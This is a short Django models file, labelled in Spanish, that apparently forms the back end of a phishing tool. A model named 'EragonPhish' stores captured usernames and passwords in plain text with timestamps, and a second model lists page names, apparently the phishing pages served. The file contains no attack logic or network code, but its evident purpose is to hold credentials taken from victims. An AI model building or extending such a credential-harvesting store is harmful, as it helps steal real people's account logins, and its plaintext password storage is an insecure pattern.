from django.db import models

# Create your models here.
class EragonPhish(models.Model):
    user = models.CharField(max_length=500, null=False, blank=False)
    passw = models.CharField(max_length=500, null=False, blank=False)
    tiempo = models.DateTimeField(auto_now_add=True)
    slug = models.SlugField()

    def __str__(self):
        return self.slug

    class Meta:
        verbose_name = "Cuenta"
        verbose_name_plural = "Cuentas"

class ListaDePaginas(models.Model):
    name = models.TextField()
    
    def __str__(self):
        return self.name

    def get_absolute_url(self):
        return self.name
    